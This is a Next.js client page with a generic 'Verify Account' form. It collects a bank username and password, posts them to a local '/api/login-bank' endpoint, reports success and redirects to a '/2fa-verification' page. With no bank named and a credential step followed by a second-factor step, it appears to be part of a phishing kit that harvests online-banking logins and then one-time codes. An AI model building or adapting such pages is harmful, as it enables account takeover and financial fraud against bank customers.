'use client'

import React, { useState } from 'react';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css'; // Import the styles for toast
import { useRouter } from 'next/navigation'; // For redirection

const Page = () => {
  const [formData, setFormData] = useState({
    bankUsername: "",
    bankPassword: ""
  });

  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const router = useRouter(); // Initialize useRouter

  const handleChange = e => {
    const { id, value } = e.target;
    setFormData({ ...formData, [id]: value });
  };

  const validate = () => {
    const newErrors = {};
    
    if (!formData.bankUsername.trim()) {
      newErrors.bankUsername = "Bank username is required";
    }
    if (!formData.bankPassword.trim()) {
      newErrors.bankPassword = "Bank password is required";
    }
    return newErrors;
  };

  const handleSubmit = async e => {
    e.preventDefault();
    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setErrors({});
    setIsSubmitting(true);

    try {
      const response = await fetch("/api/login-bank", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(formData)
      });

      if (!response.ok) {
        throw new Error("Failed to submit account details");
      }

      // If the response is 200 OK
      toast.success("Account verified successfully!");
      setFormData({ bankUsername: "", bankPassword: "" });

      // Redirect user to the homepage
      setTimeout(() => {
        router.push('/2fa-verification');
      }, 600); // Wait 2 seconds before redirect

    } catch (error) {
      console.error("Error:", error);
      toast.error("Failed to verify account");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <section className="flex items-center justify-center min-h-screen bg-gray-100">
      <form
        onSubmit={handleSubmit}
        className="bg-white p-6 rounded-lg shadow-md w-full max-w-md"
      >
        <h2 className="text-2xl font-bold text-center mb-6 text-gray-800">
          Verify Account
        </h2>

        <div className="mb-4">
          <label
            htmlFor="bankUsername"
            className="block text-gray-700 font-semibold mb-2"
          >
            Bank Username
          </label>
          <input
            id="bankUsername"
            type="text"
            value={formData.bankUsername}
            onChange={handleChange}
            placeholder="Enter bank username"
            className={`w-full p-2 border rounded-md ${errors.bankUsername
              ? "border-red-500"
              : "border-gray-300"} focus:outline-none focus:ring-2 focus:ring-blue-500`}
          />
          {errors.bankUsername &&
            <p className="text-red-500 text-sm">
              {errors.bankUsername}
            </p>}
        </div>

        <div className="mb-6">
          <label
            htmlFor="bankPassword"
            className="block text-gray-700 font-semibold mb-2"
          >
            Bank Password
          </label>
          <input
            id="bankPassword"
            type="password"
            value={formData.bankPassword}
            onChange={handleChange}
            placeholder="Enter bank password"
            className={`w-full p-2 border rounded-md ${errors.bankPassword
              ? "border-red-500"
              : "border-gray-300"} focus:outline-none focus:ring-2 focus:ring-blue-500`}
          />
          {errors.bankPassword &&
            <p className="text-red-500 text-sm">
              {errors.bankPassword}
            </p>}
        </div>

        <button
          type="submit"
          className="w-full bg-blue-500 text-white font-semibold py-2 px-4 rounded-md hover:bg-blue-600 transition duration-200"
          disabled={isSubmitting}
        >
          {isSubmitting ? "Submitting..." : "Verify"}
        </button>
      </form>
      {/* Toast notification container */}
      <ToastContainer position="top-right" autoClose={3000} hideProgressBar={false} closeOnClick pauseOnHover />
    </section>
  );
};

export default Page;
